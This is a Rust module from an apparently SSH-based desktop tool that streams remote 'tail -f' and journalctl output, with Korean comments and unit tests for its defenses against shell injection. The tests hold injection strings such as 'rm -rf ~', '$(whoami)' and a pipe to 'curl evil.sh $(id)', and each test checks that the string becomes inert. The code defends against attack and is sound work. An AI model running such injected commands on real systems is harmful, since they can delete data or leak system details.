use russh::ChannelMsg;
use serde::Serialize;
use std::collections::HashMap;
use std::sync::Arc;
use tauri::ipc::Channel;
use tokio::sync::Mutex;

use crate::ssh::SshManager;

/// 원격 셸에 그대로 전달되는 명령이므로 path 는 반드시 인용 처리한다.
/// 셸 메타문자가 포함된 파일명(악의적 서버가 만들 수 있음)이 명령으로 실행되는 것을 차단.
fn build_tail_cmd(lines: u32, path: &str) -> String {
    format!("tail -n {} -f {}", lines, shell_words::quote(path))
}

/// 사용자 입력 args 를 셸 문법대로 토큰화한 뒤 토큰별로 재인용한다.
/// `--since "1 hour ago"` 같은 인용 구문은 유지되고, `;`/`$()` 등은 리터럴 인자가 된다.
fn build_journal_cmd(args: &str) -> Result<String, String> {
    let tokens =
        shell_words::split(args).map_err(|e| format!("Invalid journalctl arguments: {e}"))?;
    let quoted: Vec<String> = tokens
        .iter()
        .map(|t| shell_words::quote(t).into_owned())
        .collect();
    Ok(format!("journalctl {}", quoted.join(" ")))
}

#[derive(Clone, Serialize)]
#[serde(tag = "type", content = "data")]
pub enum TailEvent {
    Line(TailLine),
    Error(String),
    Closed(String),
}

#[derive(Clone, Serialize)]
pub struct TailLine {
    pub tail_id: String,
    pub path: String,
    pub content: String,
}

struct TailTask {
    path: String,
    handle: tokio::task::JoinHandle<()>,
}

pub struct TailManager {
    tails: Arc<Mutex<HashMap<String, TailTask>>>,
}

impl Default for TailManager {
    fn default() -> Self {
        Self::new()
    }
}

impl TailManager {
    pub fn new() -> Self {
        Self {
            tails: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    pub async fn start(
        &self,
        tail_id: &str,
        path: &str,
        session_id: &str,
        ssh_manager: &SshManager,
        lines: u32,
        event_channel: Channel<TailEvent>,
    ) -> Result<(), String> {
        let cmd = build_tail_cmd(lines, path);
        self.start_with_cmd(tail_id, path, cmd, session_id, ssh_manager, event_channel)
            .await
    }

    /// journalctl 기반 follow. `args` 는 `journalctl` 뒤에 그대로 붙는다 (예: `-fu nginx`).
    /// 사용자가 follow 플래그를 명시하지 않으면 cat 모드가 되어 즉시 종료될 수 있음.
    pub async fn start_journal(
        &self,
        tail_id: &str,
        args: &str,
        session_id: &str,
        ssh_manager: &SshManager,
        event_channel: Channel<TailEvent>,
    ) -> Result<(), String> {
        let cmd = build_journal_cmd(args)?;
        // label 은 args 자체 — UI 의 tab 이름에 사용됨.
        let label = if args.is_empty() {
            "journalctl"
        } else {
            args
        };
        self.start_with_cmd(tail_id, label, cmd, session_id, ssh_manager, event_channel)
            .await
    }

    /// 내부 — SSH 채널 열고 임의 명령 실행 후 stdout/stderr 를 stream 으로 emit.
    async fn start_with_cmd(
        &self,
        tail_id: &str,
        label: &str,
        cmd: String,
        session_id: &str,
        ssh_manager: &SshManager,
        event_channel: Channel<TailEvent>,
    ) -> Result<(), String> {
        let ssh = ssh_manager.clone_inner();
        let tail_id_owned = tail_id.to_string();
        let label_owned = label.to_string();

        let sessions = ssh.lock().await;
        let session = sessions
            .get(session_id)
            .ok_or("SSH session not found")?;

        let mut channel = session
            .handle
            .channel_open_session()
            .await
            .map_err(|e| format!("Channel open failed: {e}"))?;

        channel
            .exec(true, cmd.as_str())
            .await
            .map_err(|e| format!("Exec failed: {e}"))?;

        drop(sessions);

        let tid = tail_id_owned.clone();
        let lbl = label_owned.clone();

        let handle = tokio::spawn(async move {
            loop {
                match channel.wait().await {
                    Some(ChannelMsg::Data { data }) => {
                        let content = String::from_utf8_lossy(&data).into_owned();
                        let _ = event_channel.send(TailEvent::Line(TailLine {
                            tail_id: tid.clone(),
                            path: lbl.clone(),
                            content,
                        }));
                    }
                    Some(ChannelMsg::ExtendedData { data, .. }) => {
                        let content = String::from_utf8_lossy(&data).into_owned();
                        let _ = event_channel.send(TailEvent::Error(content));
                    }
                    Some(ChannelMsg::Eof) | Some(ChannelMsg::Close) | None => {
                        let _ = event_channel.send(TailEvent::Closed(tid.clone()));
                        break;
                    }
                    _ => {}
                }
            }
        });

        self.tails.lock().await.insert(
            tail_id_owned,
            TailTask {
                path: label_owned,
                handle,
            },
        );

        Ok(())
    }

    pub async fn stop(&self, tail_id: &str) -> Result<(), String> {
        if let Some(task) = self.tails.lock().await.remove(tail_id) {
            task.handle.abort();
        }
        Ok(())
    }

    pub async fn list(&self) -> Vec<(String, String)> {
        self.tails
            .lock()
            .await
            .iter()
            .map(|(id, t)| (id.clone(), t.path.clone()))
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tail_cmd_plain_path() {
        assert_eq!(
            build_tail_cmd(50, "/var/log/syslog"),
            "tail -n 50 -f /var/log/syslog"
        );
    }

    #[test]
    fn tail_cmd_quotes_path_with_spaces() {
        assert_eq!(
            build_tail_cmd(10, "/var/log/my app.log"),
            "tail -n 10 -f '/var/log/my app.log'"
        );
    }

    #[test]
    fn tail_cmd_neutralizes_shell_metacharacters() {
        let cmd = build_tail_cmd(50, "/tmp/a.log; rm -rf ~");
        assert_eq!(cmd, "tail -n 50 -f '/tmp/a.log; rm -rf ~'");
    }

    #[test]
    fn tail_cmd_neutralizes_command_substitution() {
        let cmd = build_tail_cmd(50, "/tmp/$(whoami).log");
        assert_eq!(cmd, "tail -n 50 -f '/tmp/$(whoami).log'");
    }

    #[test]
    fn tail_cmd_escapes_single_quotes_in_path() {
        let cmd = build_tail_cmd(50, "/tmp/it's.log");
        // 닫는 따옴표 밖으로 빠져나가 명령을 잇지 못해야 한다.
        assert!(!cmd.contains("'/tmp/it's.log'"));
        assert!(cmd.starts_with("tail -n 50 -f "));
    }

    #[test]
    fn journal_cmd_simple_flags_pass_through() {
        assert_eq!(build_journal_cmd("-fu nginx").unwrap(), "journalctl -fu nginx");
    }

    #[test]
    fn journal_cmd_preserves_quoted_phrase() {
        assert_eq!(
            build_journal_cmd("-f --since \"1 hour ago\"").unwrap(),
            "journalctl -f --since '1 hour ago'"
        );
    }

    #[test]
    fn journal_cmd_neutralizes_injection() {
        assert_eq!(
            build_journal_cmd("-u test; whoami").unwrap(),
            "journalctl -u 'test;' whoami"
        );
    }

    #[test]
    fn journal_cmd_neutralizes_pipe_and_substitution() {
        let cmd = build_journal_cmd("-f | curl evil.sh $(id)").unwrap();
        assert_eq!(cmd, "journalctl -f '|' curl evil.sh '$(id)'");
    }

    #[test]
    fn journal_cmd_rejects_unbalanced_quote() {
        assert!(build_journal_cmd("-u \"broken").is_err());
    }
}
